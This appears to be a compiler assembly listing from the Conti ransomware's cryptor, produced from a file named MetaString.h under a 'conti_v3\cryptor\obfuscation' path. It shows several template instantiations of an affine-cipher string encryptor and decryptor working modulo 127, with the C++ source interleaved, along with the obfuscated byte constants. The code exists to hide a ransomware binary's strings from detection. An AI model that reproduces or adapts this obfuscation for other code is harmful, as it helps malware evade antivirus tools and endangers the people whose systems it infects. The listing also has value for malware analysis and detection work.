  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 6f	 sub	 ecx, 111		; 0000006fH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 01	 mov	 BYTE PTR [rcx+1], 1
  00007	c6 41 02 6f	 mov	 BYTE PTR [rcx+2], 111	; 0000006fH
  0000b	c6 41 03 35	 mov	 BYTE PTR [rcx+3], 53	; 00000035H
  0000f	c6 41 04 6f	 mov	 BYTE PTR [rcx+4], 111	; 0000006fH
  00013	c6 41 05 34	 mov	 BYTE PTR [rcx+5], 52	; 00000034H
  00017	c6 41 06 6f	 mov	 BYTE PTR [rcx+6], 111	; 0000006fH
  0001b	c6 41 07 70	 mov	 BYTE PTR [rcx+7], 112	; 00000070H
  0001f	c6 41 08 6f	 mov	 BYTE PTR [rcx+8], 111	; 0000006fH
  00023	c6 41 09 6f	 mov	 BYTE PTR [rcx+9], 111	; 0000006fH
  00027	c6 41 0a 6f	 mov	 BYTE PTR [rcx+10], 111	; 0000006fH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 04	 sub	 ecx, 4

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 64	 mov	 BYTE PTR [rcx+1], 100	; 00000064H
  00007	c6 41 02 04	 mov	 BYTE PTR [rcx+2], 4
  0000b	c6 41 03 32	 mov	 BYTE PTR [rcx+3], 50	; 00000032H
  0000f	c6 41 04 04	 mov	 BYTE PTR [rcx+4], 4
  00013	c6 41 05 07	 mov	 BYTE PTR [rcx+5], 7
  00017	c6 41 06 04	 mov	 BYTE PTR [rcx+6], 4
  0001b	c6 41 07 43	 mov	 BYTE PTR [rcx+7], 67	; 00000043H
  0001f	c6 41 08 04	 mov	 BYTE PTR [rcx+8], 4
  00023	c6 41 09 04	 mov	 BYTE PTR [rcx+9], 4
  00027	c6 41 0a 04	 mov	 BYTE PTR [rcx+10], 4
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GL@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<109,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 5d	 sub	 ecx, 93			; 0000005dH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 07	 imul	 r8d, ecx, 7

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<109,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<109,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<109,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 1b	 mov	 BYTE PTR [rcx+1], 27
  00007	c6 41 02 5d	 mov	 BYTE PTR [rcx+2], 93	; 0000005dH
  0000b	c6 41 03 00	 mov	 BYTE PTR [rcx+3], 0
  0000f	c6 41 04 5d	 mov	 BYTE PTR [rcx+4], 93	; 0000005dH
  00013	c6 41 05 6e	 mov	 BYTE PTR [rcx+5], 110	; 0000006eH
  00017	c6 41 06 5d	 mov	 BYTE PTR [rcx+6], 93	; 0000005dH
  0001b	c6 41 07 59	 mov	 BYTE PTR [rcx+7], 89	; 00000059H
  0001f	c6 41 08 5d	 mov	 BYTE PTR [rcx+8], 93	; 0000005dH
  00023	c6 41 09 5d	 mov	 BYTE PTR [rcx+9], 93	; 0000005dH
  00027	c6 41 0a 5d	 mov	 BYTE PTR [rcx+10], 93	; 0000005dH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GN@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<109,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<109,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 54 00 00 00	 mov	 eax, 84			; 00000054H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 23	 mov	 BYTE PTR [rcx+1], 35	; 00000023H
  00007	c6 41 02 54	 mov	 BYTE PTR [rcx+2], 84	; 00000054H
  0000b	c6 41 03 5a	 mov	 BYTE PTR [rcx+3], 90	; 0000005aH
  0000f	c6 41 04 54	 mov	 BYTE PTR [rcx+4], 84	; 00000054H
  00013	c6 41 05 49	 mov	 BYTE PTR [rcx+5], 73	; 00000049H
  00017	c6 41 06 54	 mov	 BYTE PTR [rcx+6], 84	; 00000054H
  0001b	c6 41 07 27	 mov	 BYTE PTR [rcx+7], 39	; 00000027H
  0001f	c6 41 08 54	 mov	 BYTE PTR [rcx+8], 84	; 00000054H
  00023	c6 41 09 54	 mov	 BYTE PTR [rcx+9], 84	; 00000054H
  00027	c6 41 0a 54	 mov	 BYTE PTR [rcx+10], 84	; 00000054H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,61,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 3d	 sub	 ecx, 61			; 0000003dH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,61,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$0DN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,61,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,61,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

